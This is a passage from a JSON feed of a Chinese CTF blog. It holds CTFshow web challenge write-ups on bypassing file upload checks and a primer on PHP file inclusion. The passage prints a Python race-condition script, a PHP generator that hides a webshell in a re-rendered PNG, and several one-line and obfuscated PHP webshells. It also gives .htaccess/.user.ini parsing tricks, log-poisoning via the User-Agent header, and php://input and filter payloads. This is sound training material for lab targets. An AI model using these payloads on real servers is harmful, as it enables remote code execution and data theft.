class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import threading</span><br><span class=\"line\"></span><br><span class=\"line\">session = requests.session()</span><br><span class=\"line\">sess = &#x27;nnnpc&#x27;</span><br><span class=\"line\">url1 = &quot;http://ce89fbe1-10ca-4a2d-808d-95e5976b5bfd.challenge.ctf.show/&quot;</span><br><span class=\"line\">url2 = &quot;http://ce89fbe1-10ca-4a2d-808d-95e5976b5bfd.challenge.ctf.show/upload&quot;</span><br><span class=\"line\">data1 = &#123;</span><br><span class=\"line\">    &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">file = &#123;</span><br><span class=\"line\">    &#x27;file&#x27;: &#x27;nnnpc&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cookies = &#123;</span><br><span class=\"line\">    &#x27;PHPSESSID&#x27;: sess</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def write():</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def read():</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        r = session.get(url2)</span><br><span class=\"line\">        if &#x27;flag&#x27; in r.text:</span><br><span class=\"line\">            print(r.text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">threads = [threading.Thread(target=write),</span><br><span class=\"line\">           threading.Thread(target=read)]</span><br><span class=\"line\">for t in threads:</span><br><span class=\"line\">    t.start()</span><br></pre></td></tr></table></figure>\n<p>开始做题，看看 web162</p>\n<p>首先上传.user.ini</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MLqYREfWtza240p6.png!thumbnail\" alt=\"\"></p>\n<p>这里不能指定特定的 1.png 之类的文件，因为对文件内容进行了过滤，把 &quot;.&quot; 过滤了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8rHmpMrjeF6OVkOy.png!thumbnail\" alt=\"\"></p>\n<p>成功上传，接着上传 png 文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tzsIqV31EnDv9nDt.png!thumbnail\" alt=\"\"></p>\n<p>成功上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/j4kukrf8jvEZr82Q.png!thumbnail\" alt=\"\"></p>\n<p>使用条件竞争脚本 cat flag（我这里使用命令行终端执行）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/25H76LFtZ8oiMD4o.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{ceb7fdf2-9db7-42e3-a3ea-4763c6b635f4}</strong></p>\n<hr>\n<h1 id=\"web163\"><a class=\"markdownIt-Anchor\" href=\"#web163\">#</a> WEB163</h1>\n<p>本题还是一个 session 的文件包含，但是发现根据 web162 的方法打不通了，于是寻找原因</p>\n<p>我们直接试试.user.ini 包含构造的 session 路径</p>\n<p><strong>语句：</strong></p>\n<p><strong>GIF89A</strong></p>\n<p><strong>auto_append_file=/tmp/sess_nnnpc</strong></p>\n<p>直接上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xe962NsGYqh9jyta.png!thumbnail\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WjsKSfWp0XkGmXfJ.png!thumbnail\" alt=\"\"></p>\n<p>用条件竞争脚本上传命令并访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6X64V8wjXShNwhkH.png!thumbnail\" alt=\"\"></p>\n<p>成功获得 flag</p>\n<p><strong>ctfshow{c636315f-3e55-46c0-9024-00b7c4aabd37}</strong></p>\n<hr>\n<h1 id=\"web164\"><a class=\"markdownIt-Anchor\" href=\"#web164\">#</a> <strong>WEB164</strong></h1>\n<p>本题考察的知识点是 png 格式图片的二次渲染</p>\n<p><strong>知识点：<br>\n在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</strong></p>\n<p>二次渲染本身就可以理解为为了安全性，对图片进行了一个很好的过滤，便是对图片的一些东西进行了适当的修改，不影响图片的原本模样，降低了风险性。而此类题目的做法便是通过脚本生成一张经过二次渲染之后依然可以有带马的一张图片，从而达到获取信息的目的</p>\n<p>脚本：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class=\"line\">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class=\"line\">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class=\"line\">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class=\"line\">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class=\"line\">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class=\"line\">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class=\"line\">           0x66, 0x44, 0x50, 0x33);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$img = imagecreatetruecolor(32, 32);</span><br><span class=\"line\"></span><br><span class=\"line\">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class=\"line\">   $r = $p[$y];</span><br><span class=\"line\">   $g = $p[$y+1];</span><br><span class=\"line\">   $b = $p[$y+2];</span><br><span class=\"line\">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class=\"line\">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">imagepng($img,&#x27;2.png&#x27;);  //要修改的图片的路径</span><br><span class=\"line\">/* 木马内容</span><br><span class=\"line\">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class=\"line\"> */</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>来看看本题，先使用脚本跑一跑<br>\n方法一：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wSB2Gq9xvjoiKlSW.png!thumbnail\" alt=\"\"></p>\n<p>打开小皮点击启动</p>\n<p>网站 -&gt;localhost-&gt; 管理 -&gt; 打开根目录</p>\n<p>把脚本存放在根目录下，浏览器访问 127.0.0.1 / 脚本名称，发现能生成 2.png 就成功了</p>\n<p>方法二：</p>\n<p>部署 php 环境，我这里是在 vscode 中部署运行的，如果在 vscode 中运行，就不需要开启小皮和将脚本放入根目录了，在自己定义的目录中即可</p>\n<p>部署环境可以参考这篇博客：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0ODAzMzM1L2FydGljbGUvZGV0YWlscy8xMDg4MDY4NTE=\">https://blog.csdn.net/qq_44803335/article/details/108806851</span></p>\n<p>png 准备好之后就可以上传了，直接上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SGvIOqzNLOcmJACS.png!thumbnail\" alt=\"\"></p>\n<p>发现上传成功，点击查看图片</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1XZK1AEEIFCoNT3T.png!thumbnail\" alt=\"\"></p>\n<p>再用记事本打开 2.png 查看下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rZKxODLM1kosoKAd.png!thumbnail\" alt=\"\"></p>\n<p>接下来就是构造命令拿 flag 了，在 url 后面跟上 &amp; 0=system</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2ViOWRiY2M0LTFjNjAtNDNiYy04Nzc1LWUyY2UwM2ExODMwYy5jaGFsbGVuZ2UuY3RmLnNob3cvZG93bmxvYWQucGhwP2ltYWdlPWZiNWM4MWVkM2EyMjAwMDRiNzEwNjk2NDVmMTEyODY3LnBuZyZhbXA7MD1zeXN0ZW0=\">http://eb9dbcc4-1c60-43bc-8775-e2ce03a1830c.challenge.ctf.show/download.php?image=fb5c81ed3a220004b71069645f112867.png&amp;0=system</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7GjeGSPHN9WkwEXO.png!thumbnail\" alt=\"\"></p>\n<p>post data 传 1=tac f*</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PTqEdUiMwu5GVDgR.png!thumbnail\" alt=\"\"></p>\n<p>execute 之后 ctrl+s 下载保存图片</p>\n<p>用记事本打开图片得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bA5wIo05zv8A0hyQ.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{fbaff217-7284-4f2c-87ce-a3f4bd2a9d15}</strong></p>\n<hr>\n<h1 id=\"web165\"><a class=\"markdownIt-Anchor\" href=\"#web165\">#</a> <strong>WEB165</strong></h1>\n<h1 id=\"web166\"><a class=\"markdownIt-Anchor\" href=\"#web166\">#</a> <strong>WEB166</strong></h1>\n<p>本题考查的知识点是只能上传后缀为 zip 的文件，构造一句话 zip 上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lUlgbs6804NHeGaD.png!thumbnail\" alt=\"\"></p>\n<p><strong>语句： <code>&lt;?php @eval($_POST['flag']);?&gt;</code> </strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/klYV8I00yoBbMfhF.png!thumbnail\" alt=\"\"></p>\n<p>上传成功，点击下载文件 bp 抓包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TB7LHy1bJmXNDJEt.png!thumbnail\" alt=\"\"></p>\n<p>显示了上传路径，这里有两种获取 flag 的方式</p>\n<p>方法一：直接蚁剑 getshell</p>\n<p><strong>路径：</strong><span class=\"exturl\" data-url=\"aHR0cDovLzU5NzJjNTJjLTI1NGMtNGQ3ZS04MzM4LWU3N2E1NjgyMzkwMS5jaGFsbGVuZ2UuY3RmLnNob3cvdXBsb2FkL2Rvd25sb2FkLnBocD9maWxlPWY5MzIyZDJjYmYxYjU5NWVkYTc4ZDQwZWI0Y2MyNjY1LnppcA==\">http://5972c52c-254c-4d7e-8338-e77a56823901.challenge.ctf.show/upload/download.php?file=f9322d2cbf1b595eda78d40eb4cc2665.zip</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DC31b871dxaj8ylv.png!thumbnail\" alt=\"\"></p>\n<p>在 /var/www/html/flag.php 下找到 flag</p>\n<p><strong>ctfshow{2aa24662-a040-4c85-8eba-7ca444b59198}</strong></p>\n<hr>\n<p>方法二：文件包含命令 cat flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/emkjdso9cd6eolFw.png!thumbnail\" alt=\"\"></p>\n<p><strong>路径：</strong><span class=\"exturl\" data-url=\"aHR0cDovLzU5NzJjNTJjLTI1NGMtNGQ3ZS04MzM4LWU3N2E1NjgyMzkwMS5jaGFsbGVuZ2UuY3RmLnNob3cvdXBsb2FkL2Rvd25sb2FkLnBocD9maWxlPWY5MzIyZDJjYmYxYjU5NWVkYTc4ZDQwZWI0Y2MyNjY1LnppcA==\">http://5972c52c-254c-4d7e-8338-e77a56823901.challenge.ctf.show/upload/download.php?file=f9322d2cbf1b595eda78d40eb4cc2665.zip</span></p>\n<p><strong>包含语句：flag=system (“tac …/f*”);phpinfo ();</strong></p>\n<p>bp 抓包发包获得 flag（比较稳）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BZsXtNoF6f9ZkqeZ.png!thumbnail\" alt=\"\"></p>\n<p>也可以 hackbar 直接传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/49WQ3XVuJWGxQeCC.png!thumbnail\" alt=\"\"></p>\n<p>获得 flag</p>\n<p><strong>ctfshow{2aa24662-a040-4c85-8eba-7ca444b59198}</strong></p>\n<hr>\n<h1 id=\"web167\"><a class=\"markdownIt-Anchor\" href=\"#web167\">#</a> <strong>WEB167</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rHxSUvhtSg2hC97a.png!thumbnail\" alt=\"\"></p>\n<p>看提示应该是和 apache 有关，而本题考察的知识点也就是上传.htaccess 绕过</p>\n<p>.htaccess 和.user.ini 的作用差不多，只不过.htaccess 使用范围仅限在 apache，两者起的都是解析作用</p>\n<p><strong>.htaccess：</strong></p>\n<p><strong>方式一：</strong></p>\n<p><strong>AddType application/x-httpd-php .png</strong></p>\n<p><strong>方式二：</strong></p>\n<p><strong>&lt;FilesMatch “png”&gt;</strong></p>\n<p><strong>SetHandler application/x-httpd-php</strong></p>\n<p><strong> <code>&lt;/FilesMatch&gt;</code> </strong></p>\n<p>开启环境，上传</p>\n<p>本题尝试了一下发现只能上传 jpg 格式的文件，不过不要紧，bp 抓包绕过</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Mpy3HBBFg6ISJZ20.png!thumbnail\" alt=\"\"></p>\n<p>接下来直接上传一句话木马</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZvqSscM2igX4YgZj.png!thumbnail\" alt=\"\"></p>\n<p>还是有两种方法，用 hackbar cat flag 和蚁剑 getshell</p>\n<p>方法一：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mSRzW5vuX3OIZ966.png!thumbnail\" alt=\"\"></p>\n<p><strong>URL:</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzM0NmU2ZGU5LTc5ZGQtNDY1OC1iN2JiLTFkNGRkMTQxOTY2ZS5jaGFsbGVuZ2UuY3RmLnNob3cvdXBsb2FkL2ZsYWcucG5n\">http://346e6de9-79dd-4658-b7bb-1d4dd141966e.challenge.ctf.show/upload/flag.png</span></p>\n<p><strong>POST data：</strong></p>\n<p><strong>flag=system(“tac …/f*”);phpinfo();</strong></p>\n<p>方法二：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rplcd6HkrgXHSNNn.png!thumbnail\" alt=\"\"></p>\n<p>/var/www/html/flag.php 找到 flag</p>\n<p><strong>ctfshow{29c520eb-4ced-4f41-94e5-83e115a8ee3d}</strong></p>\n<hr>\n<h1 id=\"web168\"><a class=\"markdownIt-Anchor\" href=\"#web168\">#</a> <strong>WEB168</strong></h1>\n<p>接下来所考察的都是免杀</p>\n<p><strong>一：</strong></p>\n<p><strong>&lt;?php</strong></p>\n<p><strong>$a = “s#y#s#t#e#m”;</strong></p>\n<p><strong>$b = explode(&quot;#&quot;,$a);</strong></p>\n<p><strong>$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</strong></p>\n<p><strong>$c($_REQUEST[1]);</strong></p>\n<p><strong>?&gt;</strong></p>\n<p><strong>二：</strong></p>\n<p><strong>&lt;?php</strong></p>\n<p><strong>$a=substr(‘1s’,1).‘ystem’;</strong></p>\n<p><strong>$a($_REQUEST[1]);</strong></p>\n<p><strong>?&gt;</strong></p>\n<p><strong>三：</strong></p>\n<p><strong>&lt;?php</strong></p>\n<p><strong>$a=strrev(‘metsys’);</strong></p>\n<p><strong>$a($_REQUEST[1]);</strong></p>\n<p><strong>?&gt;</strong></p>\n<p><strong>四：</strong></p>\n<p><strong>&lt;?php</strong></p>\n<p><strong>$a=$_REQUEST[‘a’];</strong></p>\n<p><strong>$b=$_REQUEST[‘b’];</strong></p>\n<p><strong>$a($b);</strong></p>\n<p><strong>?&gt;</strong></p>\n<p>打开环境，用 bp 抓包修改后缀为 php 上传免杀马</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0QPu1qzXQ0wbTKkz.png!thumbnail\" alt=\"\"></p>\n<p>成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0SS7ElSfZfvgSzVT.png!thumbnail\" alt=\"\"></p>\n<p>点击下载文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mD8MjBUKIp7BFUg2.png!thumbnail\" alt=\"\"></p>\n<p>看到了路径，但是这个路径并不对，真正的路径是 /upload/1.php</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cKu7FjNU07Egmpc6.png!thumbnail\" alt=\"\"></p>\n<p>直接 hackbar 进行命令执行</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VQZcSGJdSlBH95UV.png!thumbnail\" alt=\"\"></p>\n<p><strong>语句：</strong></p>\n<p><strong>1=tac …/f*</strong></p>\n<p>由于页面无法被渲染，所以真正的 flag 就会在页面的注释中体现，切换到查看器查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tlcSa7ZeddgcHk6J.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{cd195f91-8967-4b33-bde6-e09622bd78df}</strong></p>\n<hr>\n<h1 id=\"web169\"><a class=\"markdownIt-Anchor\" href=\"#web169\">#</a> <strong>WEB169</strong></h1>\n<p>本题看了一些师傅的博客说是高级免杀，但是我没有成功</p>\n<p>这题可以用日志文件包含来做</p>\n<p>首先，要先来梳理一下题目上传的一些条件，经过尝试之后发现该题条件有：</p>\n<ol>\n<li>\n<p>只允许上传 zip 后缀的文件（因此要上传 zip 后抓包修改）</p>\n</li>\n<li>\n<p>类型只允许是 image/png（千万别忘记修改）<br>\n<strong>语句：</strong></p>\n</li>\n</ol>\n<p><strong>.user.ini：</strong></p>\n<p><strong>auto_append_file=/var/log/nginx/access.log</strong></p>\n<p><strong>（这里的路径可以加 &quot;&quot; 也可不加，一个不行时可以尝试另一个）</strong></p>\n<p><strong>UA 头：</strong></p>\n<p><strong> <code>&lt;?php @eval($_POST['flag']);?&gt;</code> </strong></p>\n<p>接下来就可以开始做题了</p>\n<p>这里我们先上传 user.ini，bp 抓包该类型和名称上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/idmBax9cF76xmTXO.png!thumbnail\" alt=\"\"></p>\n<p>这里使用了.user.ini 直接包含日志文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MnM5seJiDGA6KnPl.png!thumbnail\" alt=\"\"></p>\n<p>成功，接着刷新页面 bp 抓包修改 UA 头</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6MZEYkgulB6ZQICG.png!thumbnail\" alt=\"\"></p>\n<p>修改为一句话，Forward</p>\n<p>接着随便上传一个 php 文件，待会直接用这个 php 进行 getshell</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sz68V0st7uf1WKSG.png!thumbnail\" alt=\"\"></p>\n<p>这里不需要木马文件，而且木马很容易被过滤，这里询问了下 web 师傅，做出的解释是.user.ini 要解析文件，上传目录下必须要有一个 php 文件，它才能发挥它的作用，因此我们随便传一个不带马的 php 上去即可</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gijuRAoPN7jTVCdN.png!thumbnail\" alt=\"\"></p>\n<p>成功，点击下载文件的路径并不是我们想要的路径，真正的路径是 /upload/1.php（我这里传上去的 php 名称是 1.php）</p>\n<p>方法一：蚁剑连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/awUff2w3rlM664FF.png!thumbnail\" alt=\"\"></p>\n<p>在 /var/www/html/flagaa.php 这个目录下找到 flag</p>\n<p>方法二：</p>\n<p>使用 hackbar 获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ThMgExEFtygB6Lms.png!thumbnail\" alt=\"\"></p>\n<p>语句：flag=system (“tac …/f*”);phpinfo ();</p>\n<p>看到页面上的 flag_here 知道了又是无法被渲染，因此去查看器注释中寻找 flag</p>\n<p><strong>ctfshow{c486095a-95b3-4ae6-9763-dfb6da2cdc2a}</strong></p>\n<hr>\n<h1 id=\"web170\"><a class=\"markdownIt-Anchor\" href=\"#web170\">#</a> <strong>WEB170</strong></h1>\n<p>本题方法如上 web169，同样的方法再试一遍即可依然是日志文件包含，这里就不过多记录了</p>\n<hr>\n<p>这里再记录下一种看到的骚姿势，这种姿势是关于上传.htaccess 进行解析的：</p>\n<p>引用其他师傅在 wp 中所做的解释：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果要上传 .htaccess 文件但有getimagesize、exif_imagetype函数的检查，可以用`#define width 1`和`#define height 1`定义：这样.htaccess文件既不会受到影响而失效，又能绕过检测</span><br><span class=\"line\">.htaccess：</span><br><span class=\"line\">#define width 1</span><br><span class=\"line\">#define height 1</span><br><span class=\"line\">AddType applocation/x-httpd-php .jpg</span><br><span class=\"line\">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ppp&quot;</span><br></pre></td></tr></table></figure>\n<p>.htaccess 还能配合伪协议的适用，解析已经上传的内容，那么上传的内容可以是 base64 编码后的，从而绕过敏感字符检查</p>\n<p><strong>语句：</strong></p>\n<p><strong>php_value auto_append_file<br>\n&quot;php://filter/convert.base64-decode/resource=./shell.ppp&quot;</strong></p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "CTFshow文件包含",
            "date_published": "2024-04-16T05:58:18.976Z",
            "content_html": "<h1 id=\"初学文件包含\"><a class=\"markdownIt-Anchor\" href=\"#初学文件包含\">#</a> 初学文件包含</h1>\n<p>刚开始只懂一些伪协议什么的，对于一个具体的文件包含并不是很了解，先简单记录下原理</p>\n<p>文件包含漏洞：通过 PHP 函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p>\n<p>我的理解就是：由于对包含点没有进行一个很好的过滤，导致能够在包含点做出一些预想之外的操作，从而造成一些危害</p>\n<p>这里引用一下别的师傅对 php://filter 的解析：</p>\n<p><strong>php://filter 可以获取指定文件源码。当它与包含函数结合时，php://filter 流会被当作 php 文件执行。所以我们一般对其进行编码，让其不执行。从而导致<br>\n任意文件读取。</strong></p>\n<p>简单来说就是 php://filter 与包含函数结合时。该流就会被当作文件执行，而我们对其进行编码之后，它不会执行，导致了任意文件的读取</p>\n<p>记录一下别的师傅博客写的基础姿势：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://input可以访问请求的原始数据的只读流。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post设置成文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。遇到file_get_contents()要想到用php://input绕过</span><br><span class=\"line\"></span><br><span class=\"line\">poc1:</span><br><span class=\"line\"></span><br><span class=\"line\">?file=php://input</span><br><span class=\"line\"></span><br><span class=\"line\">[POST DATA] &lt;?php phpinfo();?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">还可以上传一句话木马 poc2</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">php://filter可以获取指定文件源码。php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</span><br><span class=\"line\"></span><br><span class=\"line\">poc1:</span><br><span class=\"line\"></span><br><span class=\"line\">?file=php://filter/resource=xxx.php</span><br><span class=\"line\"></span><br><span class=\"line\">poc2:</span><br><span class=\"line\"></span><br><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=xxx.php</span><br><span class=\"line\"></span><br><span class=\"line\">POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</span><br><span class=\"line\"></span><br><span class=\"line\">zip://可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</span><br><span class=\"line\"></span><br><span class=\"line\">zip://中只能传入绝对路径。</span><br><span class=\"line\"></span><br><span class=\"line\">要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</span><br><span class=\"line\"></span><br><span class=\"line\">只需要是zip的压缩包即可，后缀名可以任意更改。</span><br><span class=\"line\"></span><br><span class=\"line\">相同的类型的还有zlib://和bzip2://</span><br><span class=\"line\"></span><br><span class=\"line\">poc:</span><br><span class=\"line\"></span><br><span class=\"line\">zip://[压缩包绝对路径]#[压缩包内文件]</span><br><span class=\"line\"></span><br><span class=\"line\">?file=zip://D:\\zip.jpg%23phpinfo.txt</span><br><span class=\"line\"></span><br><span class=\"line\">data:// 同样类似与php://input，</span><br><span class=\"line\"></span><br><span class=\"line\">phar:// 有点类似zip://</span><br><span class=\"line\"></span><br><span class=\"line\">phar://中相对路径和绝对路径都可以使用</span><br></pre></td></tr></table></figure>\n<hr>\n<h1 id=\"web78\"><a class=\"markdownIt-Anchor\" href=\"#web78\">#</a> WEB78</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F4SzBZJ6OMENnvmp.png!thumbnail\" alt=\"\"></p>\n<p>进入环境查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BMfuSS64eLrfjQiM.png!thumbnail\" 